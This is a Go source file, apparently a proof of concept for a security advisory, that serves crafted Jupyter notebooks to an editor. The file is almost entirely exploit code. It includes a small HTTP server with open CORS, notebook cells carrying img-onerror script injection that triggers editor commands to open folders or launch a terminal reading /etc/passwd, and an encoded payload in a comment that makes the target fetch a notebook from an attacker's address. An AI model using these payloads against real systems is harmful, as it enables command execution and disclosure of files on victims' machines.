// https://golang.org
// go v 1.10.4 rough
// https://github.com/google/security-research/security/advisories/GHSA-pw56-c55x-cm9m
// payload=%5B%5B%22openFile%22,%22http://<ip>:<port>/something.ipynb%22%5d%5d
package main

import "net/http"
import "fmt"
import "os"
import "log"

const file = `{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=a onerror=\"let q = document.createElement('a');q.href='command:workbench.action.files.openFolder';document.body.appendChild(q);q.click()\"/>" ]
  }
]}`
const file3 = `{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=a onerror=\"let q = document.createElement('a');q.href='command:workbench.action.terminal.new?
%7B%22config%22%3A%7B%22executable%22%3A%22vim%22%2C%22args%22%3A%5B%22%2Fetc%2Fpasswd%22%5D%
7D%7D';document.body.appendChild(q);q.click()\"/>"
   ]
  }
]}`

const file2 = `hello world`

func check(err error) {
    if err != nil {
        log.Fatal(err)
    }
}

const filename = "./pwn_goser.json"

func Do() (err error) {
    fmt.Print("lol")
	http.HandleFunc("/", func(rw http.ResponseWriter, rq *http.Request) {
        fmt.Printf("%s", rq.RequestURI)
		rw.Header().Set("Access-Control-Allow-Origin", "*")
		rw.Write([]byte(file))
	})
	http.HandleFunc("/test.txt", func(rw http.ResponseWriter, rq *http.Request) {
        fmt.Printf("%s", rq.RequestURI)
		rw.Header().Set("Access-Control-Allow-Origin", "*")
		rw.Write([]byte(file2))
	})
	http.HandleFunc("/something.ipynb", func(rw http.ResponseWriter, rq *http.Request) {
        file, err := os.Open(filename)
        check(err)
        info, err := os.Stat(filename)
        check(err)
        dat := make([]byte, info.Size())
        count, err := file.Read(dat)
        check(err)
        var count64 int64 = int64(count)
        if count64 != info.Size() {
            panic("not the right file size")
        }
        fmt.Printf("%s", rq.RequestURI)
		rw.Header().Set("Access-Control-Allow-Origin", "*")
		rw.Write([]byte(dat))
	})
	return http.ListenAndServe(":7777" /* 8080 */, http.DefaultServeMux)
}

func main() {
	if err := Do(); err != nil {
		panic(err)
	}
}
